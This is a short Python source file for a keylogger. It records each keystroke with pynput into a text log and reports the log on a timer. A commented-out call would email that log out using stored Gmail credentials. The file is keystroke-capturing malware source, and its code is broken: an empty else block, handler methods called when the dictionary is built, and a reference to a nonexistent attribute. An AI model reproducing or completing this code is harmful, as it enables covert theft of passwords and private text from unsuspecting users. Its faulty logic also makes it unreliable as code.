import pynput.keyboard
import threading
import re
from util import send_mail

class Keylogger:
	def __init__(self, interval_seconds, gmail_username, gmail_pw):
		self.TEXT_LOG = ""
		self.interval_seconds = interval_seconds
		self.gmail_username = gmail_username
		self.gmail_pw = gmail_pw

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
		with keyboard_listener as kbl:
			self.report()
			kbl.join()

	def process_keystroke(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			keymap = {
				"backspace": self.backspace_log(),
				"space": self.append_log(" "),
				"enter": self.append_log("\n")
			}
			if key not in keymap:
				current_key = str(key).split(".")[1].upper()
			else:
				
		if current_key:
			self.append_log(current_key)

	def backspace_log(self):
		# Only backspace if last character was alphanumeric
		if self.TEXT_LOG[-1:].isalnum():
			self.TEXT_LOG = self.TEXT_LOG[:-1]

	def append_log(self, string):
		self.TEXT_LOG += string
	
	def clear_log(self):
		self.TEXT_LOG = ""

	def send_log(self):
		# send_mail(email=self.gmail_username, password=self.gmail_pw, message=self.LOG)
		print(self.TEXT_LOG)
		self.clear_log()
		
	def report(self):
		if self.TEXT_LOG != "":
			self.send_log()
		log_interval = self.interval_seconds
		timer = threading.Timer(log_interval, self.report)
		timer.start()